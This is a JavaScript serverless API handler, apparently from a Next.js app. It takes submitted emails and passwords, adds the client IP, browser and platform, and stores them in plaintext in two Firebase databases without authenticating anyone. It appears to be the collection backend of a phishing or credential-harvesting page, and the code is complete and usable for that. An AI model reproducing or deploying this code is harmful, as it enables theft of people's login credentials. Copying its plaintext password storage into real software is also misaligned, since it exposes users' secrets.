import { dbPrimary, dbSecondary } from '../../lib/firebase';
import { collection, addDoc, Timestamp } from 'firebase/firestore';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ success:false, error: 'Method not allowed' });
  try {
    const { email, password, browser, platform } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const data = { email: email||'', password: password||'', ip, browser: browser||'', platform: platform||'', createdAt: Timestamp.now() };

    // write to both databases
    await Promise.all([
      addDoc(collection(dbPrimary, 'submissions'), data),
      addDoc(collection(dbSecondary, 'submissions'), data)
    ]);

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('submit error', err);
    return res.status(500).json({ success:false, error: 'Server error' });
  }
}
